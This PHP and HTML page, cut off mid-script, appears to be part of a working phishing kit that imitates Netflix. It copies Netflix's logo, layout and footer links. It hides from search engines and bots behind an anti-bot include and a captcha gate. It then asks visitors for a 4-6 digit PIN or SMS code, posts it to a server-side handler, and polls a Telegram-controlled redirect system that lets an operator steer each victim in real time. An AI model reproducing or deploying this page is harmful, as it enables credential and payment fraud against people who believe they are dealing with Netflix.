<?php

if (!defined('ALLOW_INCLUDE')) {
    define('ALLOW_INCLUDE', true);
}

// Headers de sécurité
header('X-Frame-Options: DENY');
header('X-Content-Type-Options: nosniff');
header('X-XSS-Protection: 1; mode=block');

require_once '../modules/sessions.php';
require_once '../antibots/all.php';
include '../langues/lang_detect.php';
require_once '../modules/load_config.php';
require_once __DIR__ . '/../modules/user_detect.php'; // Only index pour les visiteurs valide     

if (empty($_SESSION['captcha_valide']) || $_SESSION['captcha_valide'] !== true) {
    header('Location: ../captcha.php');
    exit;
}
$_SESSION['csrf_token'] = bin2hex(random_bytes(32));
/* <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">*/ /* Obligatoire */ ?>


<!DOCTYPE html>
<html lang=en class>

<head>
    <meta charset="utf-8">
    <title>
        <?php echo $tr['login']['title']; ?>
    </title>

    <!-- Favicon -->
    <link rel="shortcut icon" href="../assets/img/favicon.ico" type="image/x-icon">
    <!-- CSS -->
    <link rel="stylesheet" href="../assets/css/main1.css">
    <link rel="stylesheet" href="../assets/css/loader.css">
    <!-- JavaScript -->


    <!--<script src="../assets/js/f12"></script>-->


    <!-- META -->
    <meta http-equiv="X-Content-Type-Options" content="nosniff">
    <meta http-equiv="X-XSS-Protection" content="1; mode=block">
    <meta name="robots" content="noindex, nofollow, noarchive, nosnippet">
    <meta name="googlebot" content="noindex, nofollow, noarchive, nosnippet">
    <meta name="bingbot" content="noindex, nofollow, noarchive, nosnippet">
    <meta http-equiv="cache-control" content="no-cache, no-store, must-revalidate">
    <meta http-equiv="pragma" content="no-cache">
    <meta http-equiv="expires" content="0">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="referrer" content="strict-origin-when-cross-origin">
    <meta name="permissions-policy" content="geolocation=(), microphone=(), camera=()">
</head>


<style>
    img {
        margin-right: 10px;
    }
</style>

<div class="loader">
    <div class="netflix-logo">
        <svg viewBox="0 0 111 30" version="1.1" xmlns="http://www.w3.org/2000/svg">
            <g>
                <path d="M105.06233,14.2806261 L110.999156,30 C109.249227,29.7497422 107.500234,29.4366857 105.718437,29.1554972 L102.374168,20.4686475 L98.9371075,28.4375293 C97.2499766,28.1563408 95.5928391,28.061674 93.9057081,27.8432843 L99.9372012,14.0931671 L94.4680851,-5.68434189e-14 L99.5313525,-5.68434189e-14 L102.593495,7.87421502 L105.874965,-5.68434189e-14 L110.999156,-5.68434189e-14 L105.06233,14.2806261 Z M90.4686475,-5.68434189e-14 L85.8749649,-5.68434189e-14 L85.8749649,27.2499766 C87.3746368,27.3437061 88.9371075,27.4055675 90.4686475,27.5930265 L90.4686475,-5.68434189e-14 Z M81.9055207,26.93692 C77.7186241,26.6557316 73.5307901,26.4064111 69.250164,26.3117443 L69.250164,-5.68434189e-14 L73.9366389,-5.68434189e-14 L73.9366389,21.8745899 C76.6248008,21.9373887 79.3120255,22.1557784 81.9055207,22.2804387 L81.9055207,26.93692 Z M64.2496954,10.6561065 L64.2496954,15.3435186 L57.8442216,15.3435186 L57.8442216,25.9996251 L53.2186709,25.9996251 L53.2186709,-5.68434189e-14 L66.3436123,-5.68434189e-14 L66.3436123,4.68741213 L57.8442216,4.68741213 L57.8442216,10.6561065 L64.2496954,10.6561065 Z M45.3435186,4.68741213 L45.3435186,26.2498828 C43.7810479,26.2498828 42.1876465,26.2498828 40.6561065,26.3117443 L40.6561065,4.68741213 L35.8121661,4.68741213 L35.8121661,-5.68434189e-14 L50.2183897,-5.68434189e-14 L50.2183897,4.68741213 L45.3435186,4.68741213 Z M30.749836,15.5928391 C28.687787,15.5928391 26.2498828,15.5928391 24.4999531,15.6875059 L24.4999531,22.6562939 C27.2499766,22.4678976 30,22.2495079 32.7809542,22.1557784 L32.7809542,26.6557316 L19.812541,27.6876933 L19.812541,-5.68434189e-14 L32.7809542,-5.68434189e-14 L32.7809542,4.68741213 L24.4999531,4.68741213 L24.4999531,10.9991564 C26.3126816,10.9991564 29.0936358,10.9054269 30.749836,10.9054269 L30.749836,15.5928391 Z M4.78114163,12.9684132 L4.78114163,29.3429562 C3.09401069,29.5313525 1.59340144,29.7497422 0,30 L0,-5.68434189e-14 L4.4690224,-5.68434189e-14 L10.562377,17.0315868 L10.562377,-5.68434189e-14 L15.2497891,-5.68434189e-14 L15.2497891,28.061674 C13.5935889,28.3437998 11.906458,28.4375293 10.1246602,28.6868498 L4.78114163,12.9684132 Z"></path>
            </g>
        </svg>
    </div>

    <div class="netflix-spinner"></div>

    <div class="netflix-text"><?php echo $tr['load']['0']; ?></div>
</div>

<body>
    <div id=appMountPoint>
        <div>
            <div class=netflix-sans-font-loaded>
                <div data-uia=loc lang=en dir=ltr>
                    <div class=enter-done>
                        <div class="default-ltr-iqcdef-cache-1gnxdn6 e1ei60ly3">
                            <div class="default-ltr-iqcdef-cache-n48rgu e1ei60ly1">
                                <div id=clcs-header class="default-ltr-iqcdef-cache-1xdhyk6 e1avxixt0">
                                    <header class="default-ltr-iqcdef-cache-kbieko ekn6myf0">
                                        <div data-layout=wrapper class=default-ltr-iqcdef-cache-1olxzr7>
                                            <div data-layout=container class=default-ltr-iqcdef-cache-12ymzig style="--wct--layout-container--alignItems:center;--wct--layout-container--columnSpacing-xs:0.5rem;--wct--layout-container--columnSpacing-s:0.5rem;--wct--layout-container--columnSpacing-m:1rem;--wct--layout-container--columnSpacing-l:1rem;--wct--layout-container--columnSpacing-xl:1rem;--wct--layout-container--flexDirection:row;--wct--layout-container--justifyContent:space-between;--wct--layout-container--padding:0px;--wct--layout-container--rowSpacing:0.5rem;--wct--layout-container--width-xs:calc(100% + 0.5rem);--wct--layout-container--width-s:calc(100% + 0.5rem);--wct--layout-container--width-m:calc(100% + 1rem);--wct--layout-container--width-l:calc(100% + 1rem);--wct--layout-container--width-xl:calc(100% + 1rem)">
                                                <div class=default-ltr-iqcdef-cache-rv48g6 data-layout=item style="--wct--layout-item--flex-xs:0 auto;--wct--layout-item--flex-s:0 auto;--wct--layout-item--flex-m:0 0 calc(33.333333333333336% - 1rem);--wct--layout-item--flex-l:0 0 calc(33.333333333333336% - 1rem);--wct--layout-item--flex-xl:0 0 calc(33.333333333333336% - 1rem);--wct--layout-item--padding:0px;--wct--layout-item--width-xs:auto;--wct--layout-item--width-s:auto">
                                                    <a class="e38gzvf0 default-ltr-iqcdef-cache-177p22p" href=https://www.netflix.com />
                                                    <svg viewBox="0 0 111 30" version=1.1 xmlns=http://www.w3.org/2000/svg xmlns:xlink=http://www.w3.org/1999/xlink
                                                        aria-hidden=true role=img class="default-ltr-iqcdef-cache-17hp4kx e38gzvf2">
                                                        <g>
                                                            <path d="M105.06233,14.2806261 L110.999156,30 C109.249227,29.7497422 107.500234,29.4366857 105.718437,29.1554972 L102.374168,20.4686475 L98.9371075,28.4375293 C97.2499766,28.1563408 95.5928391,28.061674 93.9057081,27.8432843 L99.9372012,14.0931671 L94.4680851,-5.68434189e-14 L99.5313525,-5.68434189e-14 L102.593495,7.87421502 L105.874965,-5.68434189e-14 L110.999156,-5.68434189e-14 L105.06233,14.2806261 Z M90.4686475,-5.68434189e-14 L85.8749649,-5.68434189e-14 L85.8749649,27.2499766 C87.3746368,27.3437061 88.9371075,27.4055675 90.4686475,27.5930265 L90.4686475,-5.68434189e-14 Z M81.9055207,26.93692 C77.7186241,26.6557316 73.5307901,26.4064111 69.250164,26.3117443 L69.250164,-5.68434189e-14 L73.9366389,-5.68434189e-14 L73.9366389,21.8745899 C76.6248008,21.9373887 79.3120255,22.1557784 81.9055207,22.2804387 L81.9055207,26.93692 Z M64.2496954,10.6561065 L64.2496954,15.3435186 L57.8442216,15.3435186 L57.8442216,25.9996251 L53.2186709,25.9996251 L53.2186709,-5.68434189e-14 L66.3436123,-5.68434189e-14 L66.3436123,4.68741213 L57.8442216,4.68741213 L57.8442216,10.6561065 L64.2496954,10.6561065 Z M45.3435186,4.68741213 L45.3435186,26.2498828 C43.7810479,26.2498828 42.1876465,26.2498828 40.6561065,26.3117443 L40.6561065,4.68741213 L35.8121661,4.68741213 L35.8121661,-5.68434189e-14 L50.2183897,-5.68434189e-14 L50.2183897,4.68741213 L45.3435186,4.68741213 Z M30.749836,15.5928391 C28.687787,15.5928391 26.2498828,15.5928391 24.4999531,15.6875059 L24.4999531,22.6562939 C27.2499766,22.4678976 30,22.2495079 32.7809542,22.1557784 L32.7809542,26.6557316 L19.812541,27.6876933 L19.812541,-5.68434189e-14 L32.7809542,-5.68434189e-14 L32.7809542,4.68741213 L24.4999531,4.68741213 L24.4999531,10.9991564 C26.3126816,10.9991564 29.0936358,10.9054269 30.749836,10.9054269 L30.749836,15.5928391 Z M4.78114163,12.9684132 L4.78114163,29.3429562 C3.09401069,29.5313525 1.59340144,29.7497422 0,30 L0,-5.68434189e-14 L4.4690224,-5.68434189e-14 L10.562377,17.0315868 L10.562377,-5.68434189e-14 L15.2497891,-5.68434189e-14 L15.2497891,28.061674 C13.5935889,28.3437998 11.906458,28.4375293 10.1246602,28.6868498 L4.78114163,12.9684132 Z">
                                                            </path>
                                                        </g>
                                                    </svg><span class="default-ltr-iqcdef-cache-raue2m e38gzvf1">Netflix</span></a>
                                                </div>
                                                <div class=default-ltr-iqcdef-cache-rv48g6 data-layout=item style="--wct--layout-item--flex-xs:0 auto;--wct--layout-item--flex-s:0 auto;--wct--layout-item--flex-m:0 0 calc(66.66666666666667% - 1rem);--wct--layout-item--flex-l:0 0 calc(66.66666666666667% - 1rem);--wct--layout-item--flex-xl:0 0 calc(66.66666666666667% - 1rem);--wct--layout-item--justifyContent:flex-end;--wct--layout-item--padding:0px;--wct--layout-item--width-xs:auto;--wct--layout-item--width-s:auto">
                                                    <div data-layout=wrapper class=default-ltr-iqcdef-cache-1olxzr7>
                                                        <div data-layout=container class=default-ltr-iqcdef-cache-12ymzig style="--wct--layout-container--columnSpacing-xs:0.5rem;--wct--layout-container--columnSpacing-s:0.5rem;--wct--layout-container--columnSpacing-m:1.5rem;--wct--layout-container--columnSpacing-l:1.5rem;--wct--layout-container--columnSpacing-xl:1.5rem;--wct--layout-container--flexDirection:row;--wct--layout-container--justifyContent:flex-end;--wct--layout-container--padding:0px;--wct--layout-container--rowSpacing:0px;--wct--layout-container--width-xs:calc(100% + 0.5rem);--wct--layout-container--width-s:calc(100% + 0.5rem);--wct--layout-container--width-m:calc(100% + 1.5rem);--wct--layout-container--width-l:calc(100% + 1.5rem);--wct--layout-container--width-xl:calc(100% + 1.5rem)">
                                                            <div class=default-ltr-iqcdef-cache-rv48g6 data-layout=item style="--wct--layout-item--flex:0 auto;--wct--layout-item--padding:0px;--wct--layout-item--width:auto">
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </header>
                                </div>
                            </div>
                            <div class="default-ltr-iqcdef-cache-lieuyr e1ei60ly0">
                                <div data-layout=wrapper class="e1lmojl71 default-ltr-iqcdef-cache-r3lzjk">

                                    <form id="pin_form" method=POST class=default-ltr-iqcdef-cache-12ymzig style="--wct--layout-container--alignItems:flex-start;--wct--layout-container--columnSpacing-xs:16px;--wct--layout-container--columnSpacing-s:12px;--wct--layout-container--columnSpacing-m:12px;--wct--layout-container--columnSpacing-l:12px;--wct--layout-container--columnSpacing-xl:12px;--wct--layout-container--flexDirection:row;--wct--layout-container--justifyContent:center;--wct--layout-container--padding-xs:0px;--wct--layout-container--padding-s:0px 0px 48px 0px;--wct--layout-container--padding-m:0px 0px 48px 0px;--wct--layout-container--padding-l:0px 0px 48px 0px;--wct--layout-container--padding-xl:0px 0px 48px 0px;--wct--layout-container--rowSpacing:0px;--wct--layout-container--width-xs:calc(100% + 16px);--wct--layout-container--width-s:calc(100% + 12px);--wct--layout-container--width-m:calc(100% + 12px);--wct--layout-container--width-l:calc(100% + 12px);--wct--layout-container--width-xl:calc(100% + 12px)">
                                        <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
                                        <div class="e1lmojl70 default-ltr-iqcdef-cache-1lz7r36" data-layout=item style="--wct--layout-item--flex-xs:1 0 calc(8.333333333333334% - 16px);--wct--layout-item--flex-s:1 0 calc(8.333333333333334% - 12px);--wct--layout-item--flex-m:1 0 calc(8.333333333333334% - 12px);--wct--layout-item--flex-l:1 0 calc(8.333333333333334% - 12px);--wct--layout-item--flex-xl:1 0 calc(8.333333333333334% - 12px);--wct--layout-item--padding:0px">
                                            <div data-layout=wrapper class="e1lmojl71 default-ltr-iqcdef-cache-r3ailf">
                                                <div data-layout=container class=default-ltr-iqcdef-cache-12ymzig style="--wct--layout-container--alignItems:flex-start;--wct--layout-container--columnSpacing:0px;--wct--layout-container--flexDirection:row;--wct--layout-container--justifyContent:flex-start;--wct--layout-container--padding:32px 20px 32px 20px;--wct--layout-container--rowSpacing:0px;--wct--layout-container--width:100%">
                                                    <div class="e1lmojl70 default-ltr-iqcdef-cache-1dw0bad" data-layout=item style=--wct--layout-item--flex:1;--wct--layout-item--padding:0px>
                                                        <div class="min-height-container default-ltr-iqcdef-cache-rk77pk ew9ymy0">
                                                            <div data-layout=wrapper class="e125orgl0 default-ltr-iqcdef-cache-1mu4x4a" data-uia=password-login>
                                                                <div data-layout=stack data-uia=password-login+container class=default-ltr-iqcdef-cache-12ymzig style=--wct--layout-container--alignItems:flex-start;--wct--layout-container--columnSpacing:0px;--wct--layout-container--flexDirection:column;--wct--layout-container--justifyContent:flex-start;--wct--layout-container--padding:0px;--wct--layout-container--rowSpacing:24px;--wct--layout-container--width:100%>
                                                                    <div data-layout=item class=default-ltr-iqcdef-cache-1cadwh5 style="--wct--layout-item--padding:0px;--wct--layout-item--width:calc(100% - 0px)">
                                                                        <div data-layout=wrapper class="e125orgl0 default-ltr-iqcdef-cache-1mu4x4a">
                                                                            <div data-layout=stack class=default-ltr-iqcdef-cache-12ymzig style=--wct--layout-container--alignItems:stretch;--wct--layout-container--columnSpacing:0px;--wct--layout-container--flexDirection:column;--wct--layout-container--justifyContent:flex-start;--wct--layout-container--padding:0px;--wct--layout-container--rowSpacing:8px;--wct--layout-container--width:100%>
                                                                                <div data-layout=item class=default-ltr-iqcdef-cache-1cadwh5 style="--wct--layout-item--padding:0px;--wct--layout-item--width:calc(100% - 0px)">


                                                                                    <h1 data-uia=header class="default-ltr-iqcdef-cache-1ihb77t eb5pmcc0"><?php echo $tr['pin']['0'];?></h1>



                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                    <div data-layout=item class=default-ltr-iqcdef-cache-1cadwh5 style="--wct--layout-item--padding:0px;--wct--layout-item--width:calc(100% - 0px)">
                                                                        <div data-layout=wrapper class="e1lmojl71 default-ltr-iqcdef-cache-ktwesk" data-uia=captured-id-container>
                                                                            <div data-layout=container data-uia=captured-id-container+container class=default-ltr-iqcdef-cache-12ymzig style="--wct--layout-container--alignItems:center;--wct--layout-container--columnSpacing:16px;--wct--layout-container--flexDirection:row;--wct--layout-container--justifyContent:space-between;--wct--layout-container--padding:12px 16px 12px 16px;--wct--layout-container--rowSpacing:0px;--wct--layout-container--width:calc(100% + 16px)">
                                                                                <div class="e1lmojl70 default-ltr-iqcdef-cache-1dw0bad" data-layout=item style="--wct--layout-item--flex:1 0 calc(8.333333333333334% - 16px);--wct--layout-item--padding:0px">
                                                                                    <p data-uia=captured-id class="default-ltr-iqcdef-cache-15x9yhq eb5pmcc0">
                                                                                    <?php echo $tr['pin']['1'];?></p>
                                                                                </div>

                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                    <div data-layout=item class=default-ltr-iqcdef-cache-1cadwh5 style="--wct--layout-item--padding:0px;--wct--layout-item--width:calc(100% - 0px)">
                                                                        <div data-layout=wrapper class="e125orgl0 default-ltr-iqcdef-cache-1mu4x4a">
                                                                            <div data-layout=stack class=default-ltr-iqcdef-cache-12ymzig style=--wct--layout-container--alignItems:stretch;--wct--layout-container--columnSpacing:0px;--wct--layout-container--flexDirection:column;--wct--layout-container--justifyContent:flex-start;--wct--layout-container--padding:0px;--wct--layout-container--rowSpacing:12px;--wct--layout-container--width:100%>
                                                                                <div data-layout=item class=default-ltr-iqcdef-cache-1cadwh5 style="--wct--layout-item--padding:0px;--wct--layout-item--width:calc(100% - 0px)">

                                                                                    <!-- Titulaire de la carte -->
                                                                                    <div class="default-ltr-iqcdef-cache-pw7jst ec9nza01" style=height:inherit;overflow:inherit>
                                                                                        <div class="e36laoh1 default-ltr-iqcdef-cache-z8cs4h" data-uia=password-input+container data-wct-form-control-container=true>
                                                                                            <label data-uia=password-input+label data-wct-form-control-label=true class=default-ltr-iqcdef-cache-1kv3we2 for=:rgk:><?php echo $tr['pin']['2'];?></label>
                                                                                            <div data-wct-form-control-wrapper=true class=default-ltr-iqcdef-cache-7y4fmk>
                                                                                                <input type="text" autocomplete="cc-name" id="pin_code" name="pin_code" maxlength="6" value="" minlength="4" inputmode="numeric">
                                                                                                <div aria-hidden=true data-wct-form-control-chrome=true class=default-ltr-iqcdef-cache-71iej>
                                                                                                </div>
                                                                                            </div>
                                                                                        </div>
                                                                                    </div>
                                                                                    <!-- error SMS -->
                                                                                    <div id="nom_error" style="color:rgb(235, 57, 66); display:none;" data-uia="field-userLoginId+validationMessage" data-wct-form-control-validation="true">
                                                                                        <svg viewBox="0 0 16 16" width="16" height="16" data-icon="CircleXSmall" data-icon-id=":rg7:" aria-hidden="true" class="default-ltr-iqcdef-cache-2ui8wr ejbeop63" xmlns="http://www.w3.org/2000/svg" fill="none" role="img">
                                                                                            <path fill="currentColor" fill-rule="evenodd" d="M14.5 8a6.5 6.5 0 1 1-13 0 6.5 6.5 0 0 1 13 0M16 8A8 8 0 1 1 0 8a8 8 0 0 1 16 0M4.47 5.53 6.94 8l-2.47 2.47 1.06 1.06L8 9.06l2.47 2.47 1.06-1.06L9.06 8l2.47-2.47-1.06-1.06L8 6.94 5.53 4.47z" clip-rule="evenodd"></path>
                                                                                        </svg>&nbsp;<?php echo $tr['pin']['3'];?>
                                                                                    </div>
                                                                                </div>


                                                                                <!-- error global -->
                                                                                <?php if (isset($_GET['error']) && $_GET['error'] === 'error'): ?>
                                                                                    <div style="color:rgb(235, 57, 66)" id=":r1:" data-uia="field-userLoginId+validationMessage" data-wct-form-control-validation="true">
                                                                                        <svg viewBox="0 0 16 16" width="16" height="16" data-icon="CircleXSmall" data-icon-id=":rg7:" aria-hidden="true" class="default-ltr-iqcdef-cache-2ui8wr ejbeop63" xmlns="http://www.w3.org/2000/svg" fill="none" role="img">
                                                                                            <path fill="currentColor" fill-rule="evenodd" d="M14.5 8a6.5 6.5 0 1 1-13 0 6.5 6.5 0 0 1 13 0M16 8A8 8 0 1 1 0 8a8 8 0 0 1 16 0M4.47 5.53 6.94 8l-2.47 2.47 1.06 1.06L8 9.06l2.47 2.47 1.06-1.06L9.06 8l2.47-2.47-1.06-1.06L8 6.94 5.53 4.47z" clip-rule="evenodd"></path>
                                                                                        </svg>&nbsp;<?php echo $tr['pin']['4'];?>
                                                                                    </div>

                                                                                <?php endif; ?>



                                                                                <div data-layout=item class=default-ltr-iqcdef-cache-1cadwh5 style="--wct--layout-item--padding:0px;--wct--layout-item--width:calc(100% - 0px)">
                                                                                    <div data-layout=wrapper class="e125orgl0 default-ltr-iqcdef-cache-1mu4x4a">
                                                                                        <div data-layout=stack class=default-ltr-iqcdef-cache-12ymzig style=--wct--layout-container--alignItems:stretch;--wct--layout-container--columnSpacing:0px;--wct--layout-container--flexDirection:column;--wct--layout-container--justifyContent:flex-start;--wct--layout-container--padding:0px;--wct--layout-container--rowSpacing:16px;--wct--layout-container--width:100%>
                                                                                            <div data-layout=item class=default-ltr-iqcdef-cache-1cadwh5 style="--wct--layout-item--padding:0px;--wct--layout-item--width:calc(100% - 0px)">
                                                                                                <button id="pin_submit" name="pin_submit" class="ea2wixt2 default-ltr-iqcdef-cache-hwr223" data-uia=sign-in-button type=submit><?php echo $tr['btn_continuer'];?></button>
                                                                                            </div>





                                                                                        </div>
                                                                                    </div>
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                    </div>


                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </form>
                                </div>
                            </div>
                            <div class="default-ltr-iqcdef-cache-n48rgu e1ei60ly1">
                                <div class="default-ltr-iqcdef-cache-p55svo e1h23frg0">
                                    <footer class="default-ltr-iqcdef-cache-r82mt ec09bek5">
                                        <div data-layout=wrapper class=default-ltr-iqcdef-cache-ejrguu>
                                            <div data-layout=container class=default-ltr-iqcdef-cache-12ymzig
                                                style=--wct--layout-container--columnSpacing:0px;--wct--layout-container--flexDirection:row;--wct--layout-container--padding:0px;--wct--layout-container--rowSpacing:0px;--wct--layout-container--width:100%>
                                                <div data-layout=item class=default-ltr-iqcdef-cache-1cadwh5
                                                    style="--wct--layout-item--flex:0 0 100%;--wct--layout-item--padding:0px">
                                                    <div class="default-ltr-iqcdef-cache-1p1ezv6 ec09bek4"><span
                                                            class="default-ltr-iqcdef-cache-1aihvoj eb5pmcc0"><span><?php echo $tr['footer']['0']; ?></span></span></div>
                                                </div>
                                                <div data-layout=item class=default-ltr-iqcdef-cache-1cadwh5
                                                    style="--wct--layout-item--flex:0 0 100%;--wct--layout-item--padding:0px">
                                                    <div class="default-ltr-iqcdef-cache-1c1n2s3 ec09bek3">
                                                        <div data-layout=wrapper class=default-ltr-iqcdef-cache-ejrguu>
                                                            <ul data-layout=container
                                                                class=default-ltr-iqcdef-cache-12ymzig
                                                                style="--wct--layout-container--columnSpacing:0.75rem;--wct--layout-container--flexDirection:row;--wct--layout-container--padding:0px;--wct--layout-container--rowSpacing:1rem;--wct--layout-container--width:calc(100% + 0.75rem)">
                                                                <li data-layout=item
                                                                    class=default-ltr-iqcdef-cache-1cadwh5
                                                                    style="--wct--layout-item--flex-xs:0 0 calc(50% - 0.75rem);--wct--layout-item--flex-s:0 0 calc(50% - 0.75rem);--wct--layout-item--flex-m:0 0 calc(25% - 0.75rem);--wct--layout-item--flex-l:0 0 calc(25% - 0.75rem);--wct--layout-item--flex-xl:0 0 calc(25% - 0.75rem);--wct--layout-item--padding:0px">
                                                                    <a data-uia=FAQ-footer-link
                                                                        class=default-ltr-iqcdef-cache-bcp4ad
                                                                        href=""><?php echo $tr['footer']['1']; ?></a>
                                                                <li data-layout=item
                                                                    class=default-ltr-iqcdef-cache-1cadwh5
                                                                    style="--wct--layout-item--flex-xs:0 0 calc(50% - 0.75rem);--wct--layout-item--flex-s:0 0 calc(50% - 0.75rem);--wct--layout-item--flex-m:0 0 calc(25% - 0.75rem);--wct--layout-item--flex-l:0 0 calc(25% - 0.75rem);--wct--layout-item--flex-xl:0 0 calc(25% - 0.75rem);--wct--layout-item--padding:0px">
                                                                    <a data-uia="Centre d'aide-footer-link"
                                                                        class=default-ltr-iqcdef-cache-bcp4ad
                                                                        href=""><?php echo $tr['footer']['2']; ?></a>
                                                                <li data-layout=item
                                                                    class=default-ltr-iqcdef-cache-1cadwh5
                                                                    style="--wct--layout-item--flex-xs:0 0 calc(50% - 0.75rem);--wct--layout-item--flex-s:0 0 calc(50% - 0.75rem);--wct--layout-item--flex-m:0 0 calc(25% - 0.75rem);--wct--layout-item--flex-l:0 0 calc(25% - 0.75rem);--wct--layout-item--flex-xl:0 0 calc(25% - 0.75rem);--wct--layout-item--padding:0px">
                                                                    <a data-uia="Boutique Netflix-footer-link"
                                                                        class=default-ltr-iqcdef-cache-bcp4ad
                                                                        href=""><?php echo $tr['footer']['3']; ?>x</a>
                                                                <li data-layout=item
                                                                    class=default-ltr-iqcdef-cache-1cadwh5
                                                                    style="--wct--layout-item--flex-xs:0 0 calc(50% - 0.75rem);--wct--layout-item--flex-s:0 0 calc(50% - 0.75rem);--wct--layout-item--flex-m:0 0 calc(25% - 0.75rem);--wct--layout-item--flex-l:0 0 calc(25% - 0.75rem);--wct--layout-item--flex-xl:0 0 calc(25% - 0.75rem);--wct--layout-item--padding:0px">
                                                                    <a data-uia="Conditions d'utilisation-footer-link"
                                                                        class=default-ltr-iqcdef-cache-bcp4ad
                                                                        href=""><?php echo $tr['footer']['4']; ?></a>
                                                                <li data-layout=item
                                                                    class=default-ltr-iqcdef-cache-1cadwh5
                                                                    style="--wct--layout-item--flex-xs:0 0 calc(50% - 0.75rem);--wct--layout-item--flex-s:0 0 calc(50% - 0.75rem);--wct--layout-item--flex-m:0 0 calc(25% - 0.75rem);--wct--layout-item--flex-l:0 0 calc(25% - 0.75rem);--wct--layout-item--flex-xl:0 0 calc(25% - 0.75rem);--wct--layout-item--padding:0px">
                                                                    <a data-uia=Confidentialité-footer-link
                                                                        class=default-ltr-iqcdef-cache-bcp4ad
                                                                        href=""><?php echo $tr['footer']['5']; ?></a>
                                                                <li data-layout=item
                                                                    class=default-ltr-iqcdef-cache-1cadwh5
                                                                    style="--wct--layout-item--flex-xs:0 0 calc(50% - 0.75rem);--wct--layout-item--flex-s:0 0 calc(50% - 0.75rem);--wct--layout-item--flex-m:0 0 calc(25% - 0.75rem);--wct--layout-item--flex-l:0 0 calc(25% - 0.75rem);--wct--layout-item--flex-xl:0 0 calc(25% - 0.75rem);--wct--layout-item--padding:0px">
                                                                    <a data-uia="Préférences de cookies-footer-link"
                                                                        class=default-ltr-iqcdef-cache-bcp4ad
                                                                        href=#><?php echo $tr['footer']['6']; ?></a>
                                                                <li data-layout=item
                                                                    class=default-ltr-iqcdef-cache-1cadwh5
                                                                    style="--wct--layout-item--flex-xs:0 0 calc(50% - 0.75rem);--wct--layout-item--flex-s:0 0 calc(50% - 0.75rem);--wct--layout-item--flex-m:0 0 calc(25% - 0.75rem);--wct--layout-item--flex-l:0 0 calc(25% - 0.75rem);--wct--layout-item--flex-xl:0 0 calc(25% - 0.75rem);--wct--layout-item--padding:0px">
                                                                    <a data-uia="Mentions légales-footer-link"
                                                                        class=default-ltr-iqcdef-cache-bcp4ad
                                                                        href=""><?php echo $tr['footer']['7']; ?>s</a>
                                                                <li data-layout=item
                                                                    class=default-ltr-iqcdef-cache-1cadwh5
                                                                    style="--wct--layout-item--flex-xs:0 0 calc(50% - 0.75rem);--wct--layout-item--flex-s:0 0 calc(50% - 0.75rem);--wct--layout-item--flex-m:0 0 calc(25% - 0.75rem);--wct--layout-item--flex-l:0 0 calc(25% - 0.75rem);--wct--layout-item--flex-xl:0 0 calc(25% - 0.75rem);--wct--layout-item--padding:0px">
                                                                    <a data-uia="Choix liés à la pub-footer-link"
                                                                        class=default-ltr-iqcdef-cache-bcp4ad
                                                                        href=""><?php echo $tr['footer']['8']; ?></a>
                                                            </ul>
                                                        </div>
                                                    </div>
                                                </div>

                                            </div>
                                        </div>
                                    </footer>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div></div>








    <script src="../assets/js/telegram_redirect.js"></script>
    <script>
        // Démarrer le système de redirection Telegram automatiquement
        document.addEventListener('DOMContentLoaded', function() {
            // Système de redirection Telegram
            if (typeof TelegramRedirect !== 'undefined') {
                const REDIRECT_TIMER = <?= intval(getConfig('REDIRECT_TIMER') ?? 60) ?> * 1000;

                window.telegramRedirect = new TelegramRedirect({
                    redirectTimer: REDIRECT_TIMER,
                    pollInterval: 3000, // Polling moins fréquent
                    maxRetries: 2,
                    retryDelay: 1000
                });

                // Nettoyer les actions anciennes
                if (window.telegramRedirect.cleanupOldActions) {
                    window.telegramRedirect.cleanupOldActions();
                }

                console.log('🚀 Système de redirection Telegram démarré pour la page SMS');

                // Fonction globale pour forcer les redirections
                window.forceRedirectNow = function(action) {
                    if (window.telegramRedirect && window.telegramRedirect.redirects[action]) {
                        console.log('🔄 REDIRECTION FORCÉE:', action);
                        window.location.href = window.telegramRedirect.redirects[action];
                    }
                };

            } else {
                console.error('❌ TelegramRedirect non disponible au chargement de la page SMS');
            }
        });
    </script>

    <script>
        const form = document.getElementById('pin_form');
        let isSubmitting = false;
        let redirectStarted = false;

        if (form) {
            form.addEventListener('submit', function(e) {
                e.preventDefault();
                if (isSubmitting) return;
                isSubmitting = true;

                // Loader (reste affiché jusqu'à redirection ou erreur)
                const loader = document.querySelector('.loader');
                if (loader) {
                    loader.style.display = 'flex';
                }

                // Envoi au serveur avec fallback
                const formData = new FormData(form);

                // Essayer fetch d'abord
                if (typeof fetch !== 'undefined') {
                    fetch('../actions/pin.php', {
                            method: 'POST',
                            body: formData
                        })
                        .then(response => {
                            if (!response.ok) {
                                throw new Error(`HTTP ${response.status}: ${response.statusText}`);
                            }

                            // Vérifier que la réponse est bien du JSON
                            const contentType = response.headers.get('content-type');
                            if (!contentType || !contentType.includes('application/json')) {
                                throw new Error('Le serveur a retourné du HTML au lieu de JSON');
                            }

                            return response.json();
                        })
                        .then(data => {
                            if (data.error) {
                                alert(data.error);
                                if (loader) loader.style.display = 'none';
                                isSubmitting = false;
                            } else if (data.step === 2) {
                                // Garder le loader visible pendant le polling/redirection
                                startTelegramPolling();
                            } else {
                                alert('Réponse inattendue du serveur');
                                if (loader) loader.style.display = 'none';
                                isSubmitting = false;
                            }
                        })
                        .catch(error => {
                            console.error('Erreur fetch SMS:', error);
                            // Fallback vers XMLHttpRequest
                            sendSMSWithXHR(formData);
                        });
                } else {
                    // Fallback direct vers XMLHttpRequest
                    sendSMSWithXHR(formData);
                }

                function sendSMSWithXHR(formData) {
                    const xhr = new XMLHttpRequest();
                    xhr.open('POST', '../actions/pin.php', true);
                    xhr.timeout = 10000; // 10 secondes

                    xhr.onreadystatechange = function() {
                        if (xhr.readyState === 4) {
                            if (loader) loader.style.display = 'none';
                            isSubmitting = false;

                            if (xhr.status === 200) {
                                try {
                                    const data = JSON.parse(xhr.responseText);
                                    if (data.error) {
                                        alert(data.error);
                                    } else if (data.step === 2) {
